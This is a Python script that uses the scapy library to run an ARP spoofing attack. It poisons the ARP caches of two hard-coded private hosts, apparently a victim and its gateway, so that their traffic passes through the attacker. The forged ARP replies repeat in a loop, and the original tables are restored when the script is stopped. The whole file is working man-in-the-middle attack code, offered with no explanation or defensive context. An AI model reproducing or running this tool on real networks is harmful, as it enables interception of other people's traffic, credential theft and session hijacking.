#!/usr/bin/env python

import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    arp = scapy.ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
    )
    scapy.send(arp, verbose=False)

def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)


    packet = scapy.ARP(
        op=2,
        pdst=dest_ip,
        hwdst=dest_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )

    scapy.send(packet, count=4, verbose=False)



packets_count = 0
try:
    while True:
        spoof("192.168.111.129","192.168.111.2")
        spoof("192.168.111.2","192.168.111.129")
        packets_count += 2
        print(f"Sent {packets_count} packets.")
        time.sleep(2)
except KeyboardInterrupt:
    print("\nRestoring ARP tables...")

    restore("192.168.111.129", "192.168.111.2")
    restore("192.168.111.2", "192.168.111.129")

    print("Done. ARP tables restored.")